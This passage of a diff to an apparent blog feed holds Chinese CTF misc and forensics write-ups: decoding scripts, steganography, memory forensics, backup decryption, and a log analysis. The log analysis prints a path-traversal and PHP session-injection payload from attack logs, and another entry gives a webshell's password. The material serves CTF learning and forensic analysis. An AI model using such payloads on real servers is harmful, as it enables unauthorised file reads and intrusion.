class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">data_bin = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;res/attachment-2.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        line = line</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(line) == <span class="number">63</span>:</span><br><span class="line">            data_bin += <span class="string">&#x27;00&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(line) == <span class="number">127</span>:</span><br><span class="line">            data_bin += <span class="string">&#x27;01&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(line) == <span class="number">191</span>:</span><br><span class="line">            data_bin += <span class="string">&#x27;10&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(line) == <span class="number">255</span>:</span><br><span class="line">            data_bin += <span class="string">&#x27;11&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(data_bin)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data_bin), <span class="number">8</span>):</span><br><span class="line">    data += <span class="built_in">chr</span>(<span class="built_in">int</span>(data_bin[i:i + <span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line">f2 = <span class="built_in">open</span>(<span class="string">&quot;result.txt&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">res = binascii.unhexlify(data)</span><br><span class="line">f2.write(res)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>打开脚本输出的文件</p><p><img src="https://imag.keyblue.cn/imag/202308311501267.png" alt="image-20230831150148240"></p><p>很明显这是一个zip压缩包</p><p>我们改后缀为zip打开，发现了flag.txt</p><p><img src="https://imag.keyblue.cn/imag/202308311502949.png" alt="image-20230831150252916"></p><p>base64解码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;res/flag.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">    data = f.read().encode()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = base64.b64decode(data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure><p>得到的flag：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;189ff9e5b743ae95f940a6ccc6dbd9ab&#125;</span><br></pre></td></tr></table></figure>]]></content>
       
       
       <categories>
@@ -550,11 +151,11 @@
     
     
     <entry>
-      <title>[陇剑杯 2021]内存分析</title>
-      <link href="/2023/09/01/%5B%E9%99%87%E5%89%91%E6%9D%AF%202021%5D%E5%86%85%E5%AD%98%E5%88%86%E6%9E%90/"/>
-      <url>/2023/09/01/%5B%E9%99%87%E5%89%91%E6%9D%AF%202021%5D%E5%86%85%E5%AD%98%E5%88%86%E6%9E%90/</url>
+      <title>[SWPUCTF 2021 新生赛]我flag呢？</title>
+      <link href="/2023/08/31/%5BSWPUCTF%202021%20%E6%96%B0%E7%94%9F%E8%B5%9B%5D%E6%88%91flag%E5%91%A2%EF%BC%9F/"/>
+      <url>/2023/08/31/%5BSWPUCTF%202021%20%E6%96%B0%E7%94%9F%E8%B5%9B%5D%E6%88%91flag%E5%91%A2%EF%BC%9F/</url>
       
-        <content type="html"><![CDATA[<h2 id="问1"><a href="#问1" class="headerlink" title="问1"></a>问1</h2><p>解开压缩包得到两个文件</p><p><img src="https://imag.keyblue.cn/imag/202308291018351.png" alt="image-20230829101826317"></p><p>先看txt文本</p><p><img src="https://imag.keyblue.cn/imag/202308291018667.png" alt="image-20230829101857649"></p><p>使用volatility对文件进行分析</p><p>首先查看镜像信息</p><p><img src="https://imag.keyblue.cn/imag/202308291034248.png" alt="image-20230829103417211"></p><p>题目是需要知道虚拟机的密码，可以使用mimikatz查看或者lsadump</p><p><img src="https://imag.keyblue.cn/imag/202308291038639.png" alt="image-20230829103822601"></p><p>flag值：flag{W31C0M3 T0 THiS 34SY F0R3NSiCX}</p><h2 id="问2"><a href="#问2" class="headerlink" title="问2"></a>问2</h2><p>先找找关键字ctf或者flag什么的，发现有HUAWEI</p><p><img src="https://imag.keyblue.cn/imag/202308291057514.png" alt="image-20230829105701484"></p><p>根据题意，flag在某品牌手机的备份文件里面，随机筛选HUAWEI关键词</p><p><img src="https://imag.keyblue.cn/imag/202308291057863.png" alt="image-20230829105749832"></p><p>将文件都下载下来</p><p><img src="https://imag.keyblue.cn/imag/202308291103074.png" alt="image-20230829110349048"></p><p>下载华为备份解密工具，</p><p>工具地址：<a href="https://github.com/RealityNet/kobackupdec">https://github.com/RealityNet/kobackupdec</a></p><p>使用命令解密 解密需要密码，密码根据提示是上一问的flag值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\kobackupdec.py -vvv W31C0M3_T0_THiS_34SY_F0R3NSiCX &#x27;C:\Users\dell\Downloads\Compressed\kobackupdec-master\HUAWEI P40_2021-aa-bb xx.yy.zz&#x27; C:\Users\dell\Downloads\Compressed\kobackupdec-master\buk</span><br></pre></td></tr></table></figure><p>打开解密后的文件夹，发现一个压缩包</p><p><img src="https://imag.keyblue.cn/imag/202308291220132.png" alt="image-20230829122055096"></p><p>使用7z打开</p><p><img src="https://imag.keyblue.cn/imag/202308291221941.png" alt="image-20230829122133917"></p><p>发现flag值flag{TH4NK Y0U FOR DECRYPTING MY DATA}</p>]]></content>
+        <content type="html"><![CDATA[<p>打开文件</p><p><img src="https://imag.keyblue.cn/imag/202308311317637.png" alt="image-20230831131708601"></p><p>词频统计</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from collections import Counter</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">with open(&#x27;res/附件.txt&#x27;, &#x27;r&#x27;) as f:</span><br><span class="line">    for line in f:</span><br><span class="line">        text = line</span><br><span class="line"></span><br><span class="line">text = re.findall(&quot;&#123;(.*?)&#125;&quot;, text)</span><br><span class="line">for i in text:</span><br><span class="line">    flag += i</span><br><span class="line">wordcount = Counter(flag.lower())</span><br><span class="line">wordcount = wordcount</span><br><span class="line">print(wordcount)</span><br><span class="line">for i in wordcount:</span><br><span class="line">    print(i[0], end=&#x27;&#x27;)</span><br></pre></td></tr></table></figure><p>需要注意的是，题目给的文本是两行，我们把两行合并成一行保存后再运行脚本</p><p>运行脚本</p><p><img src="https://imag.keyblue.cn/imag/202308311343946.png" alt="image-20230831134334915"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yourflagis81e57d2bc90364t</span><br></pre></td></tr></table></figure><p>因为t只出现了一次</p><p>所以最后的flag为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;81e57d2bc90364&#125;</span><br></pre></td></tr></table></figure>]]></content>
       
       
       <categories>
@@ -571,11 +172,137 @@
     
     
     <entry>
-      <title>[陇剑杯 2021]日志分析</title>
-      <link href="/2023/09/01/%5B%E9%99%87%E5%89%91%E6%9D%AF%202021%5D%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"/>
-      <url>/2023/09/01/%5B%E9%99%87%E5%89%91%E6%9D%AF%202021%5D%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/</url>
+      <title>[LitCTF 2023]破损的图片(初级)</title>
+      <link href="/2023/08/31/%5BLitCTF%202023%5D%E7%A0%B4%E6%8D%9F%E7%9A%84%E5%9B%BE%E7%89%87(%E5%88%9D%E7%BA%A7)/"/>
+      <url>/2023/08/31/%5BLitCTF%202023%5D%E7%A0%B4%E6%8D%9F%E7%9A%84%E5%9B%BE%E7%89%87(%E5%88%9D%E7%BA%A7)/</url>
       
-        <content type="html"><![CDATA[<h2 id="问1"><a href="#问1" class="headerlink" title="问1"></a>问1</h2><p>根据日志文件发现响应码200极少，随机筛选含200的行。</p><p>发现了泄露的<a href="http://www.zip文件/">www.zip文件</a></p><p><img src="https://imag.keyblue.cn/imag/202308271557455.png" alt="image-20230827155715439"></p><h1 id="问2"><a href="#问2" class="headerlink" title="问2"></a>问2</h1><p>查看日志，在最后发现了&#x2F;?filename&#x3D;的语句，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Ftmp%2Fsess_car&amp;content=func%7CN%3Bfiles%7Ca%3A2%3A%7Bs%3A8%3A%22filename%22%3Bs%3A16%3A%22.%2Ffiles%2Ffilename%22%3Bs%3A20%3A%22call_user_func_array%22%3Bs%3A28%3A%22.%2Ffiles%2Fcall_user_func_array%22%3B%7Dpaths%7Ca%3A1%3A%7Bs%3A5%3A%22%2Fflag%22%3Bs%3A13%3A%22SplFileObject%22%3B%7D</span><br><span class="line"></span><br><span class="line">解码得到</span><br><span class="line">../../../../../../../../../../../../../../../../../tmp/sess_car&amp;content=func|N;files|a:2:&#123;s:8:&quot;filename&quot;;s:16:&quot;./files/filename&quot;;s:20:&quot;call_user_func_array&quot;;s:28:&quot;./files/call_user_func_array&quot;;&#125;paths|a:1:&#123;s:5:&quot;/flag&quot;;s:13:&quot;SplFileObject&quot;;&#125;</span><br></pre></td></tr></table></figure><p>所以文件名为sess_car</p><h1 id="问3"><a href="#问3" class="headerlink" title="问3"></a>问3</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Ftmp%2Fsess_car&amp;content=func%7CN%3Bfiles%7Ca%3A2%3A%7Bs%3A8%3A%22filename%22%3Bs%3A16%3A%22.%2Ffiles%2Ffilename%22%3Bs%3A20%3A%22call_user_func_array%22%3Bs%3A28%3A%22.%2Ffiles%2Fcall_user_func_array%22%3B%7Dpaths%7Ca%3A1%3A%7Bs%3A5%3A%22%2Fflag%22%3Bs%3A13%3A%22SplFileObject%22%3B%7D</span><br><span class="line"></span><br><span class="line">解码得到</span><br><span class="line">../../../../../../../../../../../../../../../../../tmp/sess_car&amp;content=func|N;files|a:2:&#123;s:8:&quot;filename&quot;;s:16:&quot;./files/filename&quot;;s:20:&quot;call_user_func_array&quot;;s:28:&quot;./files/call_user_func_array&quot;;&#125;paths|a:1:&#123;s:5:&quot;/flag&quot;;s:13:&quot;SplFileObject&quot;;&#125;</span><br></pre></td></tr></table></figure><p>可以看到使用的是SplFileObject类读取的flag</p>]]></content>
+        <content type="html"><![CDATA[<p>打开压缩包，里面是一个没有后缀名的文件</p><p><img src="https://imag.keyblue.cn/imag/202308311304019.png" alt="image-20230831130438973"></p><p>用010打开，发现文件头缺失了</p><p><img src="https://imag.keyblue.cn/imag/202308311306601.png" alt="image-20230831130655578"></p><p>修复文件头</p><p><img src="https://imag.keyblue.cn/imag/202308311311610.png" alt="image-20230831131123578"></p><p>成功打开文件</p><p><img src="https://imag.keyblue.cn/imag/202308311311413.png" alt="image-20230831131146253"></p><p>flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LitCTF&#123;May you, the beauty of this world, always shine.&#125;</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> WriteUp </category>
+          
+          <category> Misc </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>[HUBUCTF 2022 新生赛]最简单的misc</title>
+      <link href="/2023/08/31/%5BHUBUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5D%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84misc/"/>
+      <url>/2023/08/31/%5BHUBUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5D%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84misc/</url>
+      
+        <content type="html"><![CDATA[<p>打开文件是一个图片</p><p><img src="https://imag.keyblue.cn/imag/202308311029117.png" alt="image-20230831102912950"></p><p>直接用010打开图片，没有发现</p><p>把文件拉到kali进行分离，没有发现</p><p>zsteg测试，发现lsb隐写</p><p><img src="https://imag.keyblue.cn/imag/202308311042725.png" alt="image-20230831104259676"></p><p>直接使用命令提取</p><p><img src="https://imag.keyblue.cn/imag/202308311046549.png" alt="image-20230831104659519"></p><p>打开1.png发现是个二维码</p><p><img src="https://imag.keyblue.cn/imag/202308311047211.png" alt="image-20230831104731175"></p><p>使用CaptfEncoder解码</p><p><img src="https://imag.keyblue.cn/imag/202308311048413.png" alt="image-20230831104856358"></p><p>flag：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;aacc4238460996f0178c18d7637c9dd5&#125;</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> WriteUp </category>
+          
+          <category> Misc </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>[SWPUCTF 2021 新生赛]原来你也玩原神</title>
+      <link href="/2023/08/31/%5BSWPUCTF%202021%20%E6%96%B0%E7%94%9F%E8%B5%9B%5D%E5%8E%9F%E6%9D%A5%E4%BD%A0%E4%B9%9F%E7%8E%A9%E5%8E%9F%E7%A5%9E/"/>
+      <url>/2023/08/31/%5BSWPUCTF%202021%20%E6%96%B0%E7%94%9F%E8%B5%9B%5D%E5%8E%9F%E6%9D%A5%E4%BD%A0%E4%B9%9F%E7%8E%A9%E5%8E%9F%E7%A5%9E/</url>
+      
+        <content type="html"><![CDATA[<p>压缩包解压错误</p><p>拖到kaili进行分离</p><p><img src="https://imag.keyblue.cn/imag/202308310952535.png" alt="image-20230831095217476"></p><p>什么也没分离出来</p><p>kali显示文件类型</p><p><img src="https://imag.keyblue.cn/imag/202308311013762.png" alt="image-20230831101327721"></p><p>发现是mp3格式文件</p><p>将文件后缀改为mp3，用Audacity打开</p><p><img src="https://imag.keyblue.cn/imag/202308311015777.png" alt="image-20230831101534739"></p><p>没有发现音频隐写</p><p>随即使用MP3Stego解码</p><p><img src="https://imag.keyblue.cn/imag/202308311016529.png" alt="image-20230831101640493"></p><p>打开分析出来的txt文本</p><p><img src="https://imag.keyblue.cn/imag/202308311017165.png" alt="image-20230831101725129"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">504b 0304 1400 0900 0800 6db2 3c53 1602</span><br><span class="line">0d75 3600 0000 7902 0000 0800 0000 7465</span><br><span class="line">7374 2e74 7874 edc4 410a 0010 1005 d0c3</span><br><span class="line">2976 3663 ff9b a428 8cc2 4272 7797 b0f4</span><br><span class="line">16cf 1229 a7ff ffb7 6f12 2c99 e0dc 052d</span><br><span class="line">f382 09b5 c754 914a 633f ce05 504b 0102</span><br><span class="line">3f00 1400 0000 0800 6db2 3c53 1602 0d75</span><br><span class="line">3600 0000 7902 0000 0800 2400 0000 0000</span><br><span class="line">0000 2000 0000 0000 0000 7465 7374 2e74</span><br><span class="line">7874 0a00 2000 0000 0000 0100 1800 054d</span><br><span class="line">41d7 73b4 d701 a780 52db 73b4 d701 cfdc</span><br><span class="line">aa53 73b4 d701 504b 0506 0000 0000 0100</span><br><span class="line">0100 5a00 0000 5c00 0000 0000</span><br></pre></td></tr></table></figure><p><img src="https://imag.keyblue.cn/imag/202308311019735.png" alt="image-20230831101949700"></p><p>发现是个zip压缩包，zip的文件头是<code>504b 0304</code></p><p>压缩包需要密码才能打开，猜测是个伪加密，改09为00</p><p><img src="https://imag.keyblue.cn/imag/202308311022721.png" alt="image-20230831102223698"></p><p>成功打开压缩包</p><p><img src="https://imag.keyblue.cn/imag/202308311023070.png" alt="image-20230831102310035"></p><p>flag：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;So_you_also_play_Genshin_impact&#125;</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> WriteUp </category>
+          
+          <category> Misc </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>[SWPU 2019]伟大的侦探</title>
+      <link href="/2023/08/30/%5BSWPU%202019%5D%E4%BC%9F%E5%A4%A7%E7%9A%84%E4%BE%A6%E6%8E%A2/"/>
+      <url>/2023/08/30/%5BSWPU%202019%5D%E4%BC%9F%E5%A4%A7%E7%9A%84%E4%BE%A6%E6%8E%A2/</url>
+      
+        <content type="html"><![CDATA[<p>打开压缩包有一个文件夹和一个txt文本</p><p><img src="https://imag.keyblue.cn/imag/202308301859149.png" alt="image-20230830185950098"></p><p>文件夹杯加密了，我们打开<code>密码.txt</code></p><p><img src="https://imag.keyblue.cn/imag/202308301900883.png" alt="image-20230830190032862"></p><p>是两串乱码</p><p>用010打开<code>密码.txt</code>，切换字符集为EBCDIC</p><p><img src="https://imag.keyblue.cn/imag/202308301908474.png" alt="image-20230830190823454"></p><p>得到了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wllm_is_the_best_team!</span><br></pre></td></tr></table></figure><p>使用这个字符串解压剩下的内容</p><p>是一堆跳舞的小人</p><p><img src="https://imag.keyblue.cn/imag/202308301912749.png" alt="image-20230830191249707"></p><p>解码图</p><p><img src="https://imag.keyblue.cn/imag/202308301934989.jpg" alt="跳舞的小人对应表"></p><p>解密得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iloveholmesandwllm</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> WriteUp </category>
+          
+          <category> Misc </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>[蓝帽杯 2022 初赛]网站取证</title>
+      <link href="/2023/08/30/%5B%E8%93%9D%E5%B8%BD%E6%9D%AF%202022%20%E5%88%9D%E8%B5%9B%5D%E7%BD%91%E7%AB%99%E5%8F%96%E8%AF%81/"/>
+      <url>/2023/08/30/%5B%E8%93%9D%E5%B8%BD%E6%9D%AF%202022%20%E5%88%9D%E8%B5%9B%5D%E7%BD%91%E7%AB%99%E5%8F%96%E8%AF%81/</url>
+      
+        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">据了解，某网上商城系一团伙日常资金往来用，从2022年4月1日起使用虚拟币GG币进行交易，现已获得该网站的源代码以及部分数据库备份文件，请您对以下问题进行分析解答。</span><br></pre></td></tr></table></figure><h2 id="问1"><a href="#问1" class="headerlink" title="问1"></a>问1</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请从网站源码中找出木马文件，并提交木马连接的密码。</span><br></pre></td></tr></table></figure><p>打开压缩包，是网站的根目录备份压缩包和sql备份文件。</p><p>我们直接解压压缩包，被火绒查杀出一个webshell</p><p><img src="https://imag.keyblue.cn/imag/202308301443483.png" alt="image-20230830144300440"></p><p>那么题目需要的木马文件应该就是它了</p><p>我们打开该文件</p><p><img src="https://imag.keyblue.cn/imag/202308301445852.png" alt="image-20230830144554819"></p><p>连接密码是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lanmaobei666</span><br></pre></td></tr></table></figure><h2 id="问2"><a href="#问2" class="headerlink" title="问2"></a>问2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请提交数据库连接的明文密码</span><br></pre></td></tr></table></figure><p>通过Seqy源码审计系统全局搜索password</p><p><img src="https://imag.keyblue.cn/imag/202308301503765.png" alt="image-20230830150325734"></p><p>点开第一个database.0.php,发现数据库用户名明文显示在此文件内，同时看到密码是由my_encrypt()函数决定的</p><p><img src="https://imag.keyblue.cn/imag/202308301504821.png" alt="image-20230830150448782"></p><p>追踪到my_encrypt()函数所在的文件</p><p><img src="https://imag.keyblue.cn/imag/202308301507686.png" alt="image-20230830150735660"></p><p>我们搭建一个php环境运行一下这个文件，同时输出密码</p><p><img src="https://imag.keyblue.cn/imag/202308301541360.png" alt="image-20230830154140311"></p><p><img src="https://imag.keyblue.cn/imag/202308301541375.png" alt="image-20230830154159345"></p><p>需要注意的是php环境版本不能高于7.1。因为代码中使用的mcrypt_module_open()函数在7.2版本被弃用了</p><p>明文密码为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KBLT123</span><br></pre></td></tr></table></figure><h2 id="问3"><a href="#问3" class="headerlink" title="问3"></a>问3</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请提交数据库金额加密混淆使用的盐值。</span><br></pre></td></tr></table></figure><p>全局搜索key</p><p><img src="https://imag.keyblue.cn/imag/202308301548623.png" alt="image-20230830154830593"></p><p>第一项内容似乎就是问题提到的盐值</p><p><img src="https://imag.keyblue.cn/imag/202308301549256.png" alt="image-20230830154947229"></p><p><em>题主似乎在说加盐最狗</em>🤣</p><p>盐值为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jyzg123456</span><br></pre></td></tr></table></figure><h2 id="问4"><a href="#问4" class="headerlink" title="问4"></a>问4</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请计算张宝在北京时间2022-04-02 00:00:00-2022-04-18 23:59:59累计转账给王子豪多少RMB？（换算比例请从数据库中获取，答案参考格式：123.45）</span><br></pre></td></tr></table></figure><p>放着别做了😂浪费时间</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> WriteUp </category>
+          
+          <category> Misc </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>[HDCTF 2023]hardMisc</title>
+      <link href="/2023/08/30/%5BHDCTF%202023%5DhardMisc/"/>
+      <url>/2023/08/30/%5BHDCTF%202023%5DhardMisc/</url>
+      
+        <content type="html"><![CDATA[<p> 打开压缩包，是个图片</p><p><img src="https://imag.keyblue.cn/imag/202308301218216.png" alt="image-20230830121850165"></p><p>直接拉到kali分离</p><p><img src="https://imag.keyblue.cn/imag/202308301219218.png" alt="image-20230830121950171"></p><p>没有东西，随机使用010打开</p><p><img src="https://imag.keyblue.cn/imag/202308301220202.png" alt="image-20230830122057163"></p><p>内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SERDVEZ7d0UxYzB3M18xMF9IRGN0Zl9NMTVjfQ==</span><br></pre></td></tr></table></figure><p>解码就是flag：HDCTF{wE1c0w3_10_HDctf_M15c}</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> WriteUp </category>
+          
+          <category> Misc </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>[SWPU 2020]耗子尾汁</title>
+      <link href="/2023/08/30/%5BSWPU%202020%5D%E8%80%97%E5%AD%90%E5%B0%BE%E6%B1%81/"/>
+      <url>/2023/08/30/%5BSWPU%202020%5D%E8%80%97%E5%AD%90%E5%B0%BE%E6%B1%81/</url>
+      
+        <content type="html"><![CDATA[<p>上来先分离试试</p><p><img src="https://imag.keyblue.cn/imag/202308301022883.png" alt="image-20230830102234837"></p><p>打开其中一个压缩包，里面有flag.txt</p><p><img src="https://imag.keyblue.cn/imag/202308301023182.png" alt="image-20230830102319142"></p><p>这是一个错误的flag</p><p>在另一个压缩包含有一个视频文件</p><p><img src="https://imag.keyblue.cn/imag/202308301024886.png" alt="image-20230830102414856"></p><p>看来是个视频隐写</p><p>播放视频，暂停看到一串字符</p><p><img src="https://imag.keyblue.cn/imag/202308301025784.png" alt="image-20230830102550742"></p><p><code>c2lnbl9pbg==</code></p><p>使用工具解码<img src="https://imag.keyblue.cn/imag/202308301027011.png" alt="image-20230830102755978"></p><p>将视频再次分离</p><p><img src="https://imag.keyblue.cn/imag/202308301030639.png" alt="image-20230830103023591"></p><p>得到一个压缩包需要密码才能解压</p><p>于是把刚刚解码得到的字符串作为密码解压</p><p>打开解压后的文本文档</p><p><img src="https://imag.keyblue.cn/imag/202308301032566.png" alt="image-20230830103225517"></p><p>翻译注释：The last layer is the single table replacement password（ 最后一层是单表替换密码  ）</p><p>原密文为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">R1pCVE9OUlhHVTNES05SWkdZWVRNUVJYSEEzVEtOUlVHNFpUT09KWEdFM0RLTlJZRzRaVE9RSlhHRTNEUU5aWkdaQkRNTlpXRzQzVEdOWlpHNDRUTVFaV0lJM1RNTlpXR1k0UT09PT0=</span><br></pre></td></tr></table></figure><p>base64解压一次得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GZBTONRXGU3DKNRZGYYTMQRXHA3TKNRUG4ZTOOJXGE3DKNRYG4ZTOQJXGE3DQNZZGZBDMNZWG43TGNZZG44TMQZWII3TMNZWGY4Q====</span><br></pre></td></tr></table></figure><p>base32解码一次得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6C76756569616B7875647379716568737A7168796B67677379796C6B767669</span><br></pre></td></tr></table></figure><p>ASCII解码得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lvueiakxudsyqehszqhykggsyylkvvi</span><br></pre></td></tr></table></figure><p>仿射密码解码得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flagyouhavesignedinsuccessfully</span><br></pre></td></tr></table></figure><p>可以看到文本文件的文件名为19_20，仿射密码a和b的值也为19_20</p><p><img src="https://imag.keyblue.cn/imag/202308301101298.png" alt="image-20230830110155260"></p><p><img src="https://imag.keyblue.cn/imag/202308301102498.png" alt="image-20230830110213462"></p><p>需要注意的是经过仿射密码得到的字符串不能直接提交</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;you_have_signed_in_successfully&#125;</span><br></pre></td></tr></table></figure>]]></content>
       
       
       <categories>
@@ -593,8 +320,8 @@
     
     <entry>
       <title>[鹤城杯 2021]New MISC</title>
-      <link href="/2023/09/01/%5B%E9%B9%A4%E5%9F%8E%E6%9D%AF%202021%5DNew%20MISC/"/>
-      <url>/2023/09/01/%5B%E9%B9%A4%E5%9F%8E%E6%9D%AF%202021%5DNew%20MISC/</url>
+      <link href="/2023/08/29/%5B%E9%B9%A4%E5%9F%8E%E6%9D%AF%202021%5DNew%20MISC/"/>
+      <url>/2023/08/29/%5B%E9%B9%A4%E5%9F%8E%E6%9D%AF%202021%5DNew%20MISC/</url>
       
